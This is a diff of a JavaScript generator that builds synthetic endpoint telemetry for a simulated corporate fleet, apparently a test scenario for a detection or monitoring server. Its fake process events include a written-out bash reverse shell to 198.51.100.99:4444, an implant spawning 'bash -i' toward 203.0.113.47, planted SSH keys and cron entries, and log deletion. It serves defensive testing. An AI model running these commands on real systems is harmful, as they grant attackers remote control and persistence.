@@ -3,7 +3,7 @@ const OFFICE = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\'
 const CHROME = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
 const POWERSHELL = `${SYSTEM}WindowsPowerShell\\v1.0\\powershell.exe`
 
-export const GROUPS = [
+const GROUPS = [
   { id: 'FIN', kind: 'LAPTOP', count: 34, net: '10.20.1.', os: 'Windows 11 Pro 24H2', arch: 'x86_64', version: '0.1.0', platform: 'windows' },
   { id: 'ENG', kind: 'WS', count: 58, net: '10.20.3.', os: 'Windows 11 Enterprise 24H2', arch: 'aarch64', version: '0.1.0', platform: 'windows' },
   { id: 'OPS', kind: 'SRV', count: 20, net: '10.30.0.', os: 'Windows Server 2022', arch: 'x86_64', version: '0.1.0', platform: 'windows' },
@@ -22,13 +22,27 @@ export const STORY = {
   heavy: 'OPS-SRV-02',
   webShell: 'WEB-SRV-04',
   napped: 'ENG-WS-07',
+  withholds: 'WEB-SRV-09',
+  tooLarge: 'WEB-SRV-11',
+  proving: ['WEB-SRV-04', 'WEB-SRV-09'],
 }
 
-export const HISTORY_SECONDS = 1500
+const WITHHELD_RULES = ['server-child', 'reverse-shell']
+const HISTORY_SECONDS = 1500
+const RECENT_SECONDS = 300
+const HEARTBEAT_SECONDS = 30
+const LARGEST_SEALED_EVENT = 4 * 1024 * 1024
+const TOLD = new Set(Object.values(STORY).flat())
 
-export function pastHeartbeats(endpoint, now, every) {
+// An endpoint with a story has run for the whole history. The others started a few minutes ago: every minute an agent runs is
+// one more sealed window its ledger writes to disk, and that is what a test tenant waits for when it comes up.
+function historyOf(endpoint) {
+  return TOLD.has(endpoint.host) ? HISTORY_SECONDS : RECENT_SECONDS
+}
+
+function pastHeartbeats(endpoint, position, now) {
   const beats = []
-  for (let at = now - HISTORY_SECONDS + (endpoint.ip.length % every); at < now - every; at += every) {
+  for (let at = now - historyOf(endpoint) + ((position * 7) % HEARTBEAT_SECONDS); at <= now; at += HEARTBEAT_SECONDS) {
     if (endpoint.host === STORY.napped && at > now - 900 && at < now - 420) continue
     if (STORY.quiet.includes(endpoint.host) && at > now - 600) continue
     beats.push({ Heartbeat: { timestamp: at } })
@@ -50,8 +64,6 @@ const PACKAGES = [
   ['systemd', '255.4-1ubuntu8.5'],
   ['xz-utils', '5.6.1+really5.4.5-1ubuntu0.2'],
 ]
-const UNPATCHED = { openssl: '3.0.13-0ubuntu3.1', libssl3t64: '3.0.13-0ubuntu3.1', curl: '8.5.0-2ubuntu10.4' }
-
 const AUTOSTART = [
   ['systemd_unit', 'ssh.service', '/usr/lib/systemd/system/ssh.service', '/usr/sbin/sshd -D', 'root'],
   ['systemd_unit', 'nginx.service', '/usr/lib/systemd/system/nginx.service', '/usr/sbin/nginx -g daemon off;', 'root'],
@@ -72,15 +84,14 @@ const PLANTED = [
   ['authorized_key', 'root@build', '/root/.ssh/authorized_keys', 'ssh-ed25519', 'root'],
 ]
 
-function inventory(endpoint, at) {
-  const number = Number(endpoint.host.slice(-2))
+function inventory(endpoint, when) {
   const packages = PACKAGES.map(([name, version]) => ({
     Package: {
-      timestamp: at,
+      timestamp: when(0),
       action: 'Present',
       manager: 'dpkg',
       name,
-      version: number % 4 === 1 ? (UNPATCHED[name] ?? version) : version,
+      version,
       architecture: 'amd64',
       previous_version: null,
     },
@@ -88,8 +99,8 @@ function inventory(endpoint, at) {
   const item = (action, when) => ([kind, name, path, command, user]) => ({
     Persistence: { timestamp: when, action, kind, name, path, command, user, enabled: true, hash: null },
   })
-  const planted = endpoint.host === STORY.webShell ? PLANTED.map(item('Added', at + 915)) : []
-  return [...packages, ...AUTOSTART.map(item('Present', at)), ...planted]
+  const planted = endpoint.host === STORY.webShell ? PLANTED.map(item('Added', when(915))) : []
+  return [...packages, ...AUTOSTART.map(item('Present', when(0))), ...planted]
 }
 
 const USER_APPS = {
@@ -100,7 +111,7 @@ const USER_APPS = {
   LAB: [['python.exe', 'C:\\Python312\\python.exe', '198.51.100.40']],
 }
 
-export function seeded(seed) {
+function seeded(seed) {
   let state = seed >>> 0
   return () => {
     state = (state + 0x6d2b79f5) >>> 0
@@ -129,19 +140,20 @@ export function fleet() {
   return hosts
 }
 
-export function telemetry(endpoint, now, random) {
-  const base = now - HISTORY_SECONDS
+function telemetry(endpoint, now, random) {
+  const span = historyOf(endpoint)
+  const when = (at) => now - span + Math.floor((at * span) / HISTORY_SECONDS)
   const events = []
   let pid = 2000 + Math.floor(random() * 400) * 4
   const next = () => (pid += 4)
   const start = (at, id, ppid, image, args = [], uid = 0) =>
-    events.push({ Process: { timestamp: base + at, action: 'Create', pid: id, ppid, executable_path: image, command_line: [image, ...args], uid, hash: null } })
+    events.push({ Process: { timestamp: when(at), action: 'Create', pid: id, ppid, executable_path: image, command_line: [image, ...args], uid, hash: null } })
   const exit = (at, id, ppid, image) =>
-    events.push({ Process: { timestamp: base + at, action: 'Terminate', pid: id, ppid, executable_path: image, command_line: [], uid: 0, hash: null } })
+    events.push({ Process: { timestamp: when(at), action: 'Terminate', pid: id, ppid, executable_path: image, command_line: [], uid: 0, hash: null } })
   const connect = (at, id, image, ip, port, sent, received) =>
-    events.push({ Network: { timestamp: base + at, action: 'Connect', pid: id, process_path: image, protocol: 'tcp', source_ip: endpoint.ip, source_port: 49152 + Math.floor(random() * 16000), dest_ip: ip, dest_port: port, bytes_sent: sent, bytes_received: received } })
+    events.push({ Network: { timestamp: when(at), action: 'Connect', pid: id, process_path: image, protocol: 'tcp', source_ip: endpoint.ip, source_port: 49152 + Math.floor(random() * 16000), dest_ip: ip, dest_port: port, bytes_sent: sent, bytes_received: received } })
   const touch = (action) => (at, id, image, target) =>
-    events.push({ File: { timestamp: base + at, action, pid: id, path: target, process_path: image, hash: null } })
+    events.push({ File: { timestamp: when(at), action, pid: id, path: target, process_path: image, hash: null } })
   const write = touch('Write')
   const make = touch('Create')
   const remove = touch('Delete')
@@ -172,13 +184,28 @@ export function telemetry(endpoint, now, random) {
       const implant = next()
       make(903, shell, '/usr/bin/sh', '/tmp/.cache/kworker')
       write(904, shell, '/usr/bin/sh', '/tmp/.cache/kworker')
+      write(905, shell, '/usr/bin/sh', '/tmp/.cache/run.sh')
       start(906, implant, shell, '/tmp/.cache/kworker', [], 33)
-      connect(910, implant, '/tmp/.cache/kworker', '203.0.113.47', 8443, 900, 2400)
+      const remote = next()
+      start(908, remote, implant, '/usr/bin/bash', ['-i'], 33)
+      connect(910, remote, '/usr/bin/bash', '203.0.113.47', 8443, 900, 2400)
       make(914, implant, '/tmp/.cache/kworker', '/etc/cron.d/sysupdate')
       write(915, implant, '/tmp/.cache/kworker', '/root/.ssh/authorized_keys')
       remove(918, implant, '/tmp/.cache/kworker', '/var/log/nginx/access.log')
+      exit(930, shell, 904, '/usr/bin/sh')
     }
-    events.push(...inventory(endpoint, base))
+    if (endpoint.host === STORY.withholds) {
+      start(1010, next(), 1100, '/usr/bin/bash', ['-c', 'bash -i >& /dev/tcp/198.51.100.99/4444 0>&1'], 113)
+    }
+    if (endpoint.host === STORY.tooLarge) {
+      const paths = []
+      for (let file = 0, bytes = 0; bytes <= LARGEST_SEALED_EVENT; file++) {
+        paths.push(`/var/lib/postgresql/16/main/base/16384/${String(file).padStart(8, '0')}`)
+        bytes += paths[file].length
+      }
+      start(700, next(), 640, '/usr/bin/tar', ['-czf', '/var/backups/base.tgz', ...paths])
+    }
+    events.push(...inventory(endpoint, when))
     return events
   }
 
@@ -290,4 +317,36 @@ export function telemetry(endpoint, now, random) {
     }
   }
   return events
+}
+
+function stops(endpoint, now) {
+  if (endpoint.host === STORY.serviceStop) return [{ AgentStopping: { timestamp: now, reason: 'ServiceStop' } }]
+  if (STORY.shutdown.includes(endpoint.host)) return [{ AgentStopping: { timestamp: now, reason: 'SystemShutdown' } }]
+  return []
+}
+
+function timestamp(event) {
+  return Object.values(event)[0].timestamp
+}
+
+export function scenario({ server, deploymentKey, stateDir, prover, enrollmentKeys, now }) {
+  const random = seeded(20261116)
+  const endpoints = fleet().map((endpoint, position) => {
+    const stopped = stops(endpoint, now)
+    const timeline = [...pastHeartbeats(endpoint, position, now), ...telemetry(endpoint, now, random), ...stopped]
+    return {
+      hostname: endpoint.host,
+      platform: endpoint.platform,
+      os_version: endpoint.os,
+      architecture: endpoint.arch,
+      version: endpoint.version,
+      ip_address: endpoint.ip,
+      enrollment_key: enrollmentKeys[position],
+      proving: STORY.proving.includes(endpoint.host),
+      withhold: endpoint.host === STORY.withholds ? WITHHELD_RULES : [],
+      stays_up: stopped.length === 0 && !STORY.quiet.includes(endpoint.host),
+      timeline: timeline.sort((a, b) => timestamp(a) - timestamp(b)),
+    }
+  })
+  return { server, deployment_key: deploymentKey, state_dir: stateDir, prover, heartbeat_seconds: HEARTBEAT_SECONDS, endpoints }
 }
